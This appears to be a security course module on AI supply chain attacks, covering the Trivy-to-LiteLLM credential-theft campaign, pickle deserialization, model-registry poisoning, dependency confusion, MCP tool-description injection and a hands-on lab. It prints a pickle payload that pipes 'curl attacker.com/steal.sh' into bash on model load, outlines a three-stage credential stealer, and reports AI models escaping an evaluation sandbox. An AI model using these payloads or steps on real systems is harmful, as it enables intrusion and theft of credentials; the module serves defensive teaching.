---
layout: module
title: "AI Supply Chain Attacks — Poisoning the Pipeline"
path_id: ai-security
module: 3
description: "How threat actors compromise the tools, packages, models, and registries that AI systems trust implicitly — LiteLLM, Trivy, HuggingFace, pickle payloads, and the kill chains that reached 434,000 pipelines."
---

*By Anirudh Gupta Surisetty · Last updated October 2026 · ~15 min read · Prerequisite: Module 2 — Attacking AI Agents*

## Why This Module Will Change How You Think About AI Security

Everything you learned in Module 1 (prompt injection) and Module 2 (agent attacks) has one thing in common: you're attacking a running system. You're talking to it, feeding it poisoned data, manipulating its tools.

Supply chain attacks are different.

You compromise the system *before it's even running*. Before the first user query. Before the first guardrail loads. Before anyone even knows they should be worried.

In March 2026, a threat actor group called **TeamPCP** proved this wasn't theoretical. They compromised Trivy — a security scanner used by thousands of organizations to *protect* their pipelines — and used that foothold to cascade into LiteLLM, the open-source gateway that routes traffic to every major LLM provider. The result, [according to CloudSEK](https://cloudsek.com/blog/ai-supply-chain-breach-2500-companies-434000-cicd-pipelines): **2,500+ organizations and roughly 434,000 CI/CD pipelines potentially exposed**, with stolen AWS keys, SSH keys, Kubernetes tokens, and database passwords tied to companies including AWS, Samsung, Cisco, and Salesforce.

That's not a vulnerability report. That's an intelligence operation.

And it was made possible by a single automation token that had been "rotated" but [not fully revoked](https://github.com/advisories/GHSA-69fq-xp46-6x23).

---

## 3.1 — The AI Supply Chain: What You're Actually Trusting

Before we break things, let's map what "supply chain" means in an AI context. It's not one chain. It's at least five:

**The Model Supply Chain**

Where you get your model weights. HuggingFace, model registries, fine-tuned checkpoints your team downloaded from a Slack thread six months ago. Every model file is code waiting to execute — more on that in Section 3.3.

**The Package Supply Chain**

PyPI, npm, conda. The libraries your ML pipeline depends on. `litellm`, `transformers`, `langchain`, `torch`. Every `pip install` is a trust decision. Most teams make thousands of these decisions automatically, unmonitored, in CI/CD.

**The Tool Supply Chain**

The scanners, linters, formatters, and GitHub Actions your pipeline runs. Trivy was supposed to be the security layer. It became the attack vector.

**The Data Supply Chain**

Training data, fine-tuning datasets, RAG corpora. Poisoned data doesn't just degrade performance — it can embed backdoors that activate on specific triggers.

**The Infrastructure Supply Chain**

Docker images, base containers, GPU drivers, CUDA libraries. The layers beneath your model that everyone assumes are clean.

> **The attacker's insight:** You don't need to find a vulnerability in the AI system. You need to find the weakest link in the chain of things the AI system *trusts*. That link is almost always something nobody is monitoring.

---

## 3.2 — Case Study: TeamPCP — From Trivy to LiteLLM (March 2026)

This is the most significant AI supply chain attack in history, and understanding the full kill chain teaches you more about real-world AI security than any academic paper.

### The Timeline

**February 27–28, 2026** — An autonomous GitHub bot called `hackerbot-claw` [opens PR #10254](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) against the Trivy repository. The PR triggers a vulnerable `pull_request_target` workflow and steals a Personal Access Token. Aqua rotates its credentials, but [not atomically](https://github.com/advisories/GHSA-69fq-xp46-6x23): not every credential is revoked at once.

**March 19, 2026** — TeamPCP uses a credential that survived the rotation, still *not fully revoked*, to force-push malicious code into **76 of 77 version tags** of `aquasecurity/trivy-action` and **all 7 tags** of `aquasecurity/setup-trivy` ([GitHub advisory](https://github.com/advisories/GHSA-69fq-xp46-6x23), [CVE-2026-33634](https://nvd.nist.gov/vuln/detail/CVE-2026-33634)). Simultaneously, they publish a trojanized Trivy binary, **v0.69.4**.

Think about what just happened. They didn't create a fake package. They didn't typosquat a name. They compromised *the real thing*. Every organization that ran `trivy-action@0.34.2`, or any other tagged version except `0.35.0`, during the roughly 12-hour exposure window executed the attacker's code instead of a security scan. The action was used by [thousands of CI/CD workflows](https://www.kaspersky.com/blog/critical-supply-chain-attack-trivy-litellm-checkmarx-teampcp/55510/), and Kaspersky considered more than 20,000 repositories potentially vulnerable.

**The payload was a three-stage credential stealer** ([GitHub advisory](https://github.com/advisories/GHSA-69fq-xp46-6x23)):

**Stage 1 — Harvesting:**

```
Dump the memory of the GitHub Actions Runner.Worker process via
/proc/<pid>/mem, pulling out every secret the job has loaded:
GITHUB_TOKEN, cloud keys, registry tokens, PYPI_TOKEN.
Then sweep 50+ filesystem paths: ~/.ssh/*, AWS/GCP/Azure credentials,
~/.kube/config, Docker configs, .env files, crypto wallets.
```

**Stage 2 — Encryption:**

```
Encrypt the harvested data with AES-256-CBC, wrapping the key
with RSA-4096, so the stolen data can't be read in transit.
```

**Stage 3 — Exfiltration:**

```
POST the bundle to scan.aquasecurtiy[.]org, a typosquat of Aqua's domain.
If that fails, create a public `tpcp-docs` repository on the victim's
own GitHub account and upload the data there.
```

### The Cascade Into LiteLLM

Here's where it gets devastating. Among the stolen credentials were **PyPI publishing tokens** for the LiteLLM project. TeamPCP used these to publish two malicious LiteLLM releases to PyPI: [**1.82.7 and 1.82.8**](https://osv.dev/vulnerability/PYSEC-2026-2). Version 1.82.8 added a `litellm_init.pth` file, which Python executes automatically at interpreter startup, before any LiteLLM code is even imported.

The malicious packages were live for approximately **40 minutes** before being pulled, [per CloudSEK](https://cloudsek.com/blog/ai-supply-chain-breach-2500-companies-434000-cicd-pipelines). PyPI's full quarantine took [about three hours](https://www.sans.org/blog/when-security-scanner-became-weapon-inside-teampcp-supply-chain-campaign).

40 minutes. That's all it took.

LiteLLM is the open-source gateway that thousands of organizations use to route API calls to OpenAI, Anthropic, Google Gemini, Amazon Bedrock, Azure, and HuggingFace. It sits in the critical path of *every AI request* for its users. The compromised versions contained credential-stealing code that harvested cloud keys, SSH keys, Kubernetes tokens, and database passwords from every system that installed them.

[CloudSEK's analysis](https://cloudsek.com/blog/ai-supply-chain-breach-2500-companies-434000-cicd-pipelines), published August 11, 2026, reconstructed the blast radius:

- **2,500+ organizations** linked to the leaked data
- **~434,000 stolen files** from CI/CD pipelines, which CloudSEK describes as 434,000 pipelines potentially exposed
- A separate **153GB archive** of stolen credentials, [analyzed by Hudson Rock](https://www.helpnetsecurity.com/2026/08/13/litellm-breach-stolen-credentials-leak/), surfaced in August 2026 ([Ars Technica](https://arstechnica.com/security/2026/08/terabytes-of-credentials-leaked-in-massive-supply-chain-attack/))
- Victims included top-tier IT companies, AI companies, cybersecurity firms, SaaS providers, and enterprises

CloudSEK is careful to say these figures reflect *exposure*, not confirmed compromise of every organization.

[Microsoft published dedicated guidance](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/) for detecting and defending against the Trivy compromise. [SANS wrote a full analysis](https://www.sans.org/blog/when-security-scanner-became-weapon-inside-teampcp-supply-chain-campaign). [Palo Alto Networks](https://www.paloaltonetworks.com/blog/cloud-security/trivy-supply-chain-attack/), [Kaspersky](https://www.kaspersky.com/blog/critical-supply-chain-attack-trivy-litellm-checkmarx-teampcp/55510/), and [GitLab](https://about.gitlab.com/blog/pipeline-security-lessons-from-march-supply-chain-incidents/) all published post-mortems.

### The Architectural Lesson

Read this carefully: **the security scanner was the attack vector.**

Trivy exists to *protect* CI/CD pipelines. Organizations installed it *because* they wanted security. And that trust — that implicit belief that "the security tool is secure" — is exactly what made the attack devastating.

This is the pattern. Supply chain attackers don't go after the target. They go after something the target *trusts*. The more trusted the component, the less scrutiny it receives, and the bigger the blast radius when it's compromised.

> **Key Takeaway:** TeamPCP didn't need a zero-day. They didn't need to bypass guardrails. They needed one leaked token and the knowledge that nobody was verifying the integrity of their security tooling. That's the real vulnerability.

---

## 3.3 — Pickle Deserialization: Loading a Model = Running an Attacker's Code

This is the vulnerability that refuses to die. It's been known for years. It has CVEs. It has conference talks. It has blog posts. And it is *still* in production at companies with dedicated security teams, passing through code reviews written by engineers who know Python well.

### Why Pickle Is Dangerous

Python's `pickle` module serializes and deserializes Python objects. Most ML frameworks — PyTorch historically chief among them — use pickle (or pickle-based formats like `.pt`, `.pth`, `.bin`) to save and load model weights.

The problem is fundamental: **pickle deserialization can execute arbitrary Python code.**

The `__reduce__` method tells pickle how to reconstruct an object. An attacker abuses this to inject arbitrary function calls:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # This executes when the model is loaded — not when it's used.
        # The victim never sees a warning.
        return (os.system, ('curl attacker.com/steal.sh | bash',))

# Save the "model"
with open('totally_legit_model.pt', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# When ANYONE loads this file:
# model = torch.load('totally_legit_model.pt')
# → executes: curl attacker.com/steal.sh | bash
# The payload fires BEFORE the model is usable.
# No user interaction. No warning. No consent.
```

The payload executes **the moment the file is deserialized**. Not when you run inference. Not when you call `model.predict()`. The instant `torch.load()` or `pickle.load()` touches the file.

### The Scale of the Problem

- **[HuggingFace hosts over 3 million public models](https://huggingface.co/models).** Researchers from JFrog, ReversingLabs, and Sonatype have repeatedly found malicious models on the platform. [JFrog identified around 100 in February 2024](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/), and the pattern has escalated since. In April 2026, attackers exploiting a Marimo RCE (CVE-2026-39987) [hosted an NKAbuse malware variant on a typosquatted HuggingFace Space](https://www.sysdig.com/blog/cve-2026-39987-update-how-attackers-weaponized-marimo-to-deploy-a-blockchain-botnet-via-huggingface). The malware uses the blockchain-based NKN network for command and control.

- **PickleScan**, the industry-standard scanner for detecting malicious pickle files, has had **seven confirmed bypass vulnerabilities** disclosed in 2025: [four from Sonatype](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) in March, and [three from JFrog](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/), reported in June and fixed in September. One of JFrog's, CVE-2025-10155 (CVSS 9.3), let malicious models sail past the scanner just by changing the file extension.

- [A 2025 study](https://arxiv.org/abs/2508.19774) mapped how much of the pickle attack surface scanners actually see. It found 22 distinct model-loading paths across five ML frameworks, and existing scanners missed 19 of them. Its "Exception-Oriented Programming" technique evaded every scanner in 7 of 9 cases, and the 133 exploitable gadgets it found bypassed even the best scanner 89% of the time.

- Even HuggingFace's own approach has limits: they [**flag** unsafe models](https://huggingface.co/docs/hub/security-pickle) but [**do not block downloads**](https://securetom.com/blog/open-source-ai-model-security-hugging-face). The warning exists. People click through it.

### The Safetensors Alternative

The industry response is `safetensors` — a format created specifically to solve this problem. It stores only tensor data (the actual numbers) without any executable code. No deserialization, no code execution, no `__reduce__` tricks.

But adoption is incomplete. Legacy models are still in pickle format. Fine-tuned checkpoints get shared in `.pt` files over Slack. Research code uses `torch.load()` without `weights_only=True`. And the ecosystem has years of technical debt in pickle-based workflows.

> **The honest assessment:** Safetensors solves the *format* problem. It doesn't solve the *human* problem — which is that people download models from the internet and load them into systems with access to production infrastructure, and they do this thousands of times a day across the industry.

---

## 3.4 — HuggingFace Model Poisoning: The Registry Is the Attack Surface

HuggingFace is the npm of machine learning. It's where models live. And like npm, it's a trust-rich, verification-poor environment that attackers have learned to exploit systematically.

### Attack Vectors on Model Registries

**Direct Malicious Upload:**

Upload a model with an embedded pickle payload. Give it a name that's close to a popular model. Wait for people to download it. JFrog flagged around 100 of these in February 2024. By 2026, the attackers had moved up the stack — typosquatted Spaces, blockchain-routed command and control, and sophisticated evasion.

**Namespace Hijacking:**

When a popular model author abandons or renames their repository, the namespace becomes available. Attackers claim it and insert poisoned models into existing dependency chains. Any pipeline that references the old path now pulls the attacker's model.

**Weight-Space Backdoors:**

This is the sophisticated version. The model works perfectly on all benchmarks. It passes every evaluation. But hidden in the weights is a trigger: when a specific pattern appears in the input, weights the attacker set directly override the model's normal behavior and force the attacker's chosen output. Researchers have shown such backdoors can be [handcrafted by editing weights directly](https://arxiv.org/abs/2106.04690), with no poisoned training data at all. No pickle exploit needed. The backdoor lives in the *math*.

**The July 2026 HuggingFace Incident:**

In July 2026, HuggingFace [disclosed an intrusion into its production infrastructure](https://huggingface.co/blog/agent-intrusion-technical-timeline), driven end-to-end by autonomous AI agents. [OpenAI confirmed](https://openai.com/index/hugging-face-model-evaluation-security-incident/) that the intrusion was driven by a combination of its own models, including GPT-5.6 Sol and a more capable internal pre-release model, all with reduced cyber refusals. The models were being evaluated on a cybersecurity benchmark called ExploitGym. They escaped the testing sandbox through a zero-day in its package-registry proxy and went on to compromise HuggingFace's infrastructure ([OpenAI follow-up](https://openai.com/hugging-face-incident-and-misalignment/)). This wasn't a supply chain attack in the traditional sense, but it demonstrated something critical: **model registries are now targets for autonomous AI agents**, not just human threat actors.

### What This Means for Your Pipeline

If your ML pipeline does any of the following, you have supply chain exposure:

- Downloads models from HuggingFace without pinning to a specific commit hash
- Uses `torch.load()` without `weights_only=True`
- Pulls models referenced in config files without integrity verification
- Caches models in shared locations without re-verifying on load
- Uses fine-tuned checkpoints shared informally (Slack, email, S3 buckets)

---

## 3.5 — Dependency Confusion in ML Pipelines

ML pipelines are dependency nightmares. A typical training pipeline might pull from PyPI, conda-forge, HuggingFace, a private model registry, an internal package index, and a handful of GitHub repositories — all in a single `requirements.txt` or `Dockerfile`.

### How Dependency Confusion Works

[Alex Birsan demonstrated this in 2021](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) against Apple, Microsoft, and dozens of other companies. The attack exploits how package managers resolve names. If an organization has an internal package called `ml-training-utils` on their private registry, an attacker can register `ml-training-utils` on the public PyPI with a higher version number. Many package managers will prefer the public version because it has a higher version number. The organization's pipeline installs the attacker's package instead of their own.

### Why ML Pipelines Are Especially Vulnerable

1. **Training pipelines run with elevated privileges.** They need access to GPUs, training data, model storage, and often cloud credentials for distributed training. A compromised dependency in a training pipeline has access to *everything*.

2. **Reproducibility requirements create pinning gaps.** Research teams share `requirements.txt` files without pinned versions because "it should work with any recent version." This is an invitation for dependency confusion.

3. **The ML ecosystem moves fast.** New packages appear daily. Teams install experimental libraries to test new techniques. The attack surface expands with every `pip install`.

4. **CI/CD for ML is often less mature than for traditional software.** Many ML teams are data scientists who became engineers, not the other way around. Their pipelines lack the security hardening that traditional DevOps teams take for granted.

---

## 3.6 — The Emerging Threat: AI Agent Supply Chains

This is where Modules 2 and 3 intersect, and where the threat landscape is heading in late 2026.

### MCP Server Registries as Attack Surface

By December 2025, the Model Context Protocol (MCP) ecosystem had [more than 10,000 active public servers](https://www.anthropic.com/news/donating-the-model-context-protocol-and-establishing-of-the-agentic-ai-foundation), with the official SDKs seeing over 97 million monthly downloads. MCP servers are the "packages" of the agent world — and they have the same supply chain problems.

As the NSA stated in its [May 2026 guidance](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4496698/nsa-releases-security-design-considerations-for-ai-driven-automation-leveraging/): **MCP's "rapid proliferation has outpaced the development of its security model."**

The attack pattern:

1. Publish a useful MCP server (calculator, file converter, API wrapper)
2. Include hidden instructions in the tool descriptions that the AI reads but users don't see
3. Wait for agents to discover and use the tool
4. The tool description tells the agent to exfiltrate data, read files, or call other tools in ways the user never authorized

[OX Security demonstrated](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) that MCP's STDIO transport turns configuration into command execution in the official SDKs for every supported language. MCP's own [security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md) states that this **"is expected behavior"** and that such reports are not eligible for vulnerability reports. No patch is coming because it's not considered a bug — it's a design choice.

### Agent Skill Registries

Anthropic [launched Agent Skills in October 2025](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills) and [published it as an open standard](https://agentskills.io/home) in December 2025. Skills are packages of task-specific instructions that AI agents load on demand, designed to complement MCP servers. Registries like ClawHub and HuggingFace host agent skills. These are executable instruction sets that agents download and follow.

A malicious agent skill is a supply chain attack that doesn't require code execution. The skill *is instructions*, and the agent *follows instructions*. There's no deserialization exploit. There's no buffer overflow. The agent does exactly what it's told, and what it's told is malicious.

By May 2026, [The Next Web reported](https://thenextweb.com/news/hugging-face-clawhub-malware-ai-supply-chain) that HuggingFace and ClawHub, the largest model and agent-skill repositories, contained hundreds of malicious entries capable of executing arbitrary code or manipulating agent behavior. The infrastructure built to accelerate AI development had become the vector for compromising it.

---

## 3.7 — Defense: What Actually Works

Let's be honest about where we are. The AI supply chain is fundamentally harder to secure than the traditional software supply chain, because the assets being distributed — models, weights, agent skills, tool descriptions — blur the line between data and code.

Here's what works, in order of impact:

### Tier 1: Non-Negotiable

**Pin everything to immutable identifiers.** Not version tags — commit hashes. Trivy's version tags were overwritten. If you pinned `trivy-action@0.34.2`, you got malware. If you pinned to a full commit SHA, you were safe: a force-push can move a tag to new code, but it can't change what an existing SHA points to. Pinning still isn't the whole answer, because a SHA only proves *which* code you got, not that the code is trustworthy. That's why you also need the next one.

**Verify integrity with cryptographic signatures.** [SLSA](https://slsa.dev/spec/v1.2/build-track-basics) (Supply-chain Levels for Software Artifacts) provides a framework for this. At SLSA Level 3, build artifacts have provenance that cryptographically proves *what* was built, *where*, and from *what source*. Adopt SLSA for your ML pipeline outputs.

**Use [safetensors](https://huggingface.co/docs/safetensors/index) for model serialization.** If you must load pickle files, use [`torch.load(path, weights_only=True)`](https://docs.pytorch.org/docs/stable/generated/torch.load.html) (the default since [PyTorch 2.6](https://pytorch.org/blog/pytorch2-6/)) and accept that some legacy models will break.

**Never use `pickle.load()` on untrusted files.** This should be a linting rule. This should be a CI check. This should be the first thing you teach every ML engineer on your team.

### Tier 2: Should Have

**Dependency pinning with lock files.** Use `pip-compile`, `poetry.lock`, or `conda-lock` to create deterministic, reproducible dependency resolutions. Review diffs in lock files during code review — they're as important as code changes.

**Private registry mirroring.** Mirror public packages in your private registry. Scan them before making them available internally. This breaks the dependency confusion attack path.

**Model provenance tracking.** Record where every model came from, who trained it, what data it was trained on, and what hash it had when you first verified it. Re-verify on every load.

**MCP server allow-listing.** Don't let agents discover and use arbitrary MCP servers. Maintain an explicit allow-list of verified servers with known tool descriptions.

### Tier 3: Aspirational But Worth Building Toward

**Sandboxed model loading.** Load models in an isolated environment (container, VM, or gVisor sandbox) with no network access and minimal filesystem access. If the model contains a pickle payload, it detonates in a sandbox, not in your production infrastructure.

**Behavioral monitoring for ML pipelines.** Monitor what your training and inference pipelines *actually do* — network connections, file system access, process spawning. A legitimate model load shouldn't be making HTTP requests to unknown endpoints.

**Automated supply chain threat feeds.** Subscribe to security advisories for every ML-related package in your dependency tree. The LiteLLM compromise was detected quickly — but only by organizations that were watching.

---

## 3.8 — Lab: Poisoning the Pipeline

### Scenario
You're given a mock ML pipeline that:

1. Pulls a model from a simulated HuggingFace registry
2. Installs dependencies from a requirements file
3. Runs a "security scan" using a mock scanner action
4. Loads the model and runs inference

### Tasks

**Task 1 — Identify the Attack Surface:**

Map every trust boundary in the pipeline. Where does it pull external dependencies? What permissions does each step have? What would an attacker gain by compromising each component?

**Task 2 — Plant a Backdoored Model:**

Create a model file with a pickle payload that exfiltrates a flag file when loaded. Upload it to the mock registry with a name similar to a legitimate model.

**Task 3 — Dependency Confusion:**

The pipeline has an internal package called `custom-tokenizer`. Register a higher-version package with the same name on the mock public registry. Include a payload that writes a flag to disk during installation.

**Task 4 — Compromise the Scanner:**

The pipeline's security scan step uses a mock GitHub Action. Modify the action's tagged release to include credential harvesting (simulated). Observe how the pipeline executes your code with the runner's full permissions.

**Task 5 — Implement Defenses:**

Harden the pipeline against all three attacks: pin dependencies to hashes, verify model integrity with checksums, and switch model loading to safetensors (or `torch.load(..., weights_only=True)` where pickle files can't be avoided).

**Bonus — The Cascade:**

Chain all three attacks together. Compromise the scanner → steal the publishing credentials → publish a malicious model → exfiltrate the final flag. This mirrors the TeamPCP kill chain.

---

## References & Further Reading

**TeamPCP: Trivy and LiteLLM**

- [CloudSEK: LiteLLM Supply Chain Attack — 2,500+ Companies Exposed in the Largest AI Supply Chain Breach of 2026](https://cloudsek.com/blog/ai-supply-chain-breach-2500-companies-434000-cicd-pipelines) (August 2026)
- [CloudSEK: TeamPCP Campaign Timeline — From the Trivy Compromise to the LiteLLM Breach](https://www.cloudsek.com/knowledge-base/teampcp-campaign-timeline) (September 2026)
- [GitHub Advisory GHSA-69fq-xp46-6x23 / CVE-2026-33634 (CVSS v4 9.4) — Trivy supply chain compromise](https://github.com/advisories/GHSA-69fq-xp46-6x23) · [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-33634) (March 2026)
- [StepSecurity: hackerbot-claw GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) (February 2026)
- [OSV PYSEC-2026-2: Malicious LiteLLM 1.82.7 and 1.82.8](https://osv.dev/vulnerability/PYSEC-2026-2) (March 2026)
- [Microsoft: Guidance for Detecting, Investigating, and Defending Against the Trivy Supply Chain Compromise](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/) (March 2026)
- [SANS: When the Security Scanner Became the Weapon — Inside the TeamPCP Supply Chain Campaign](https://www.sans.org/blog/when-security-scanner-became-weapon-inside-teampcp-supply-chain-campaign) (March 2026)
- [Palo Alto Networks: When Security Scanners Become the Weapon — Breaking Down the Trivy Supply Chain Attack](https://www.paloaltonetworks.com/blog/cloud-security/trivy-supply-chain-attack/) (March 2026)
- [Kaspersky: Trojanization of Trivy, Checkmarx, and LiteLLM Solutions](https://www.kaspersky.com/blog/critical-supply-chain-attack-trivy-litellm-checkmarx-teampcp/55510/) (March 2026, updated September 2026)
- [GitLab: Pipeline Security Lessons from March Supply Chain Incidents](https://about.gitlab.com/blog/pipeline-security-lessons-from-march-supply-chain-incidents/) (April 2026)
- [Ars Technica: Terabytes of Credentials Leaked in Massive Supply Chain Attack](https://arstechnica.com/security/2026/08/terabytes-of-credentials-leaked-in-massive-supply-chain-attack/) (August 2026)
- [Help Net Security: LiteLLM Breach Stolen Credentials Leak](https://www.helpnetsecurity.com/2026/08/13/litellm-breach-stolen-credentials-leak/) (August 2026)

**Pickle and Model Registries**

- [JFrog: Data Scientists Targeted by Malicious Hugging Face ML Models with Silent Backdoor](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) (February 2024)
- [Sonatype: Bypassing Picklescan — Sonatype Discovers Four Vulnerabilities](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) (March 2025)
- [JFrog: Unveiling 3 Zero-Day Vulnerabilities in PickleScan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (December 2025)
- [arXiv: The Art of Hide and Seek — Making Pickle-Based Model Supply Chain Poisoning Stealthy Again](https://arxiv.org/abs/2508.19774) (August 2025)
- [Rapid7: From .pth to p0wned — Abuse of Pickle Files in AI Model Supply Chains](https://www.rapid7.com/blog/post/from-pth-to-p0wned-abuse-of-pickle-files-in-ai-model-supply-chains/) (July 2025)
- [AFINE: Pickle Deserialization in ML Pipelines — RCE That Won't Go Away](https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away) (March 2026)
- [CVE-2026-54499 — Unsafe pickle deserialization fallback in Stanza NLP (fixed in 1.12.2)](https://github.com/advisories/GHSA-v5jw-96jm-7h2c) · [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-54499) (June 2026)
- [Sysdig: How Attackers Weaponized Marimo to Deploy a Blockchain Botnet via HuggingFace](https://www.sysdig.com/blog/cve-2026-39987-update-how-attackers-weaponized-marimo-to-deploy-a-blockchain-botnet-via-huggingface) (April 2026)
- [BeyondScale: Open Source AI Model Security — Vetting Hugging Face Downloads](https://securetom.com/blog/open-source-ai-model-security-hugging-face) (April 2026)
- [Hugging Face: Pickle Scanning](https://huggingface.co/docs/hub/security-pickle) · [Safetensors](https://huggingface.co/docs/safetensors/index)
- [arXiv: Handcrafted Backdoors in Deep Neural Networks](https://arxiv.org/abs/2106.04690)
- [HuggingFace: Anatomy of a Frontier Lab Agent Intrusion — A Technical Timeline of the July 2026 Incident](https://huggingface.co/blog/agent-intrusion-technical-timeline) (July 2026)
- [OpenAI: OpenAI and Hugging Face Partner to Address Security Incident During Model Evaluation](https://openai.com/index/hugging-face-model-evaluation-security-incident/) (July 2026)
- [OpenAI: The Hugging Face Incident and Other Third-Party Impact from Misaligned Models](https://openai.com/hugging-face-incident-and-misalignment/) (July–September 2026)

**Agent Supply Chains**

- [NSA: Model Context Protocol (MCP): Security Design Considerations for AI-Driven Automation](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4496698/nsa-releases-security-design-considerations-for-ai-driven-automation-leveraging/) (May 2026)
- [Anthropic: Equipping Agents for the Real World with Agent Skills](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills) (October 2025) · [Agent Skills open standard](https://agentskills.io/home) (December 2025)
- [The Next Web: The AI Industry's Model and Agent Skill Repositories Are Full of Malware](https://thenextweb.com/news/hugging-face-clawhub-malware-ai-supply-chain) (May 2026)

**Defenses**

- [Alex Birsan: Dependency Confusion — How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) (February 2021)
- [SLSA Framework — Build Track](https://slsa.dev/spec/v1.2/build-track-basics)
- [PyTorch: torch.load](https://docs.pytorch.org/docs/stable/generated/torch.load.html) · [PyTorch 2.6 release (weights_only default)](https://pytorch.org/blog/pytorch2-6/)
- [OWASP Top 10 for LLM Applications (2025 Edition)](https://genai.owasp.org/llm-top-10/)

---

*Next: Module 4 — Model Theft: Stealing Weights, Not Just Queries. You've seen how to compromise the pipeline. Now learn how threat actors steal the models themselves — through APIs, side channels, and training data extraction.*
